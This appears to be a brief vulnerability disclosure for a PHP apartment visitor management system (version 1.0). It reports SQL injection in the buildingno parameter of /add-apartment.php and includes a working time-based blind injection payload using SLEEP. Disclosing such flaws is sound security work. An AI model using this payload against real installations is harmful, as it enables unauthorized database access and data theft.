# The apartment visitor management system has SQL injection vulnerability

## Vulnerability author:liuyuanyuan

supplier:
https://www.sourcecodester.com/php-apartment-visitor-management-system-source-code

edition: 
1.0

/add-apartment.php

The buildingno parameter has SQL injection

Payload: apartmentno=qewqe&apartmentstatus=Owned&buildingno=C' AND (SELECT 3735 FROM (SELECT(SLEEP(5)))PkFG) AND 'cFCe'='cFCe&submit=

![image](https://github.com/user-attachments/assets/3e0c1724-d00e-46b6-b55d-0783cb0e365d)

![image](https://github.com/user-attachments/assets/f543cbbe-0678-4a66-bd34-649c18fc8a16)

